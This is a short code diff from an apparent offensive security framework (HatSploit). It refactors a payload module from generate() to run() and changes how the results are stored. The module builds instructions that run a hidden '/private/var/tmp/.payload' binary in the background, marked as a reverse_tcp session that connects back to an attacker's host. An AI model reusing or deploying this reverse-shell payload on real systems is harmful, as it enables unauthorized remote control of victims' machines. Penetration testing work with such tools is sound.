@@ -62,7 +62,7 @@ class HatSploitPayload(HatSploitPayload):
         }
     }
 
-    def generate(self):
+    def run(self):
         local_host, local_port = self.parser.parse_options(self.options)
 
         remote_data = base64.b64encode((local_host + ':' + local_port).encode())
@@ -84,7 +84,7 @@ class HatSploitPayload(HatSploitPayload):
         instructions += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
         instructions += "\n"
 
-        self.method['Payload'] = payload
-        self.method['Instructions'] = instructions
-        self.method['Session'] = session
-        self.method['Type'] = 'reverse_tcp'
+        self.payload = payload
+        self.instructions = instructions
+        self.session = session
+        self.action = 'reverse_tcp'
